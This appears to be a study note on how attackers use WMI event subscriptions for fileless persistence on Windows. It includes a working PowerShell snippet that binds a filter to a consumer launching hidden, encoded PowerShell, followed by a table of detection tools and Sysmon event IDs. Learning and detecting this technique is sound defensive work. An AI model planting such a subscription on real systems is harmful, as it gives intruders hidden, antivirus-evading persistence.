
> [!NOTE] Objective
> - Learn how WMI (Windows Management Instrumentation) works, how adversaries use it to maintain filess, trigger based persistence, and how to detect this behavior using logs, PowerShell, and WMI Explorer tools


> [!NOTE] Explain Like I Am 12
> - WMI is like a magic spellbook inside Windows. You can use it to ask, "What processes are running? What users exist? When should I run this payload?"
> - Walware uses WMI to: 
> 	- Stay persistent without files or registry entries
> 	- Run code silently when a user logs in or on system idle
> 	- Evade AVs that scan files or startup folders
> - It is like having a malware bot hide inside Window
## Deep Dive: WMI Components Used in Abuse

| WMI Components                | Purpose                        |
| ----------------------------- | ------------------------------ |
| Namespace (root\subscription) | Stores persistence triggers    |
| Filter                        | Condition(ex. user logs in)    |
| Consumer                      | What to do(ex. run Powershell) |
| FilterToConserBinding         | Links Filter + Consumer        |
- Attack Workflow
	- Create a WMI Event Filter (ex. trigger when user logs in)
	- Create a WMI Consumer (ex. run Powershell)
	- Bind the filter and consumer
	- WMI silently waits and executes when condition is met
#### Common WMI Payload
```
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = 'MaliciousFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 'MaliciousConsumer'
    CommandLineTemplate = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -enc BASE64PAYLOAD'
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```
## Tools to Detect WMI Abuse

| Tool                            | Function                                         |
| ------------------------------- | ------------------------------------------------ |
| wbemtest                        | Native WMI GUI                                   |
| Get-WmiObject / Get-CimInstance | View WMI objects                                 |
| WMI Explorer                    | GUI to explore/filter/inspect bindings           |
| Sysmon Event ID 19, 20, 21      | Detect creation of filter, consumer, and binding |
| Event Viewer: WMI-Activity      | Log execution from WMI-based processes           |

